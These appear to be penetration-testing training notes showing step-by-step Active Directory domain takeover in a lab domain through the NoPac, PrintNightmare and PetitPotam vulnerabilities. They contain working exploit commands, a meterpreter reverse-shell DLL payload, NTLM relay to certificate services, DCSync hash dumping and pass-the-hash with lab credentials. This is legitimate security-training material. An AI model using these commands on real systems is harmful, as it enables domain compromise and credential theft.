# Bleeding Edge Vulnerabilities
## NoPac (SamAccountName Spoofing)
This exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller. By default, authenticated users can add up to ten computers to a domain. When doing so, we change the name of the new host to match a Domain Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller.

NoPac [https://github.com/Ridter/noPac] uses many tools in Impacket to communicate with, upload a payload, and issue commands from the attack host to the target DC. Before attempting to use the exploit, we should ensure Impacket is installed and the noPac [] exploit repo is cloned to our attack host if needed. We can use these commands to do so:


we can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner (scanner.py) then use the exploit (noPac.py) to gain a shell as NT AUTHORITY/SYSTEM. We can use the scanner with a standard domain user account to attempt to obtain a TGT from the target Domain Controller. If successful, this indicates the system is, in fact, vulnerable. We'll also notice the ms-DS-MachineAccountQuota number is set to 10. In some environments, an astute sysadmin may set the ms-DS-MachineAccountQuota value to 0. If this is the case, the attack will fail because our user will not have the rights to add a new machine account. Setting this to 0 can prevent quite a few AD attacks.

### Scanning for NoPac
```
$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```

### Running NoPac & Getting a Shell
```
$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```

It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run. We can use ls to confirm.

### Using noPac to DCSync the Built-in Administrator Account
```
$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```


## PrintNightmare
PrintNightmare is the nickname given to two vulnerabilities (CVE-2021-34527 and CVE-2021-1675) found in the Print Spooler service that runs on all Windows operating systems. Many exploits have been written based on these vulnerabilities that allow for privilege escalation and remote code execution. Using this vulnerability for local privilege escalation is covered in the Windows Privilege Escalation module, but is also important to practice within the context of Active Directory environments for gaining remote access to a host. Let's practice with one exploit that can allow us to gain a SYSTEM shell session on a Domain Controller running on a Windows Server 2019 host.

We can use rpcdump.py to see if Print System Asynchronous Protocol and Print System Remote Protocol are exposed on the target.


### Enumerating for MS-RPRN
```
$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```

### Generating a DLL Payload
```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp

$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```

## PetitPotam (MS-EFSRPC)
PetitPotam (CVE-2021-36942) is an LSA spoofing vulnerability that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the Local Security Authority Remote Protocol (LSARPC) by abusing Microsoftâ€™s Encrypting File System Remote Protocol (MS-EFSRPC). This technique allows an unauthenticated attacker to take over a Windows domain where Active Directory Certificate Services (AD CS) is in use. In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate. This certificate can then be used with a tool such as Rubeus or gettgtpkinit.py from PKINITtools to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.

```
$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

### Running PetitPotam.py
```
$ python3 PetitPotam.py 172.16.5.225 172.16.5.5       
```

Back in our other window, we will see a successful login request and obtain the base64 encoded certificate for the Domain Controller if the attack is successful.

### Requesting a TGT Using gettgtpkinit.py
Next, we can take this base64 certificate and use gettgtpkinit.py to request a Ticket-Granting-Ticket (TGT) for the domain controller.

```
$ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
```

### Setting the KRB5CCNAME Environment Variable
The TGT requested above was saved down to the dc01.ccache file, which we use to set the KRB5CCNAME environment variable, so our attack host uses this file for Kerberos authentication attempts.

```
$ export KRB5CCNAME=dc01.ccache
```

### Using Domain Controller TGT to DCSync
We can then use this TGT with secretsdump.py to perform a DCSYnc and retrieve one or all of the NTLM password hashes for the domain.
```
$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

### Confirming Admin Access to the Domain Controller
Finally, we could use the NT hash for the built-in Administrator account to authenticate to the Domain Controller. From here, we have complete control over the domain and could look to establish persistence, search for sensitive data, look for other misconfigurations and vulnerabilities for our report, or begin enumerating trust relationships.

```
$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
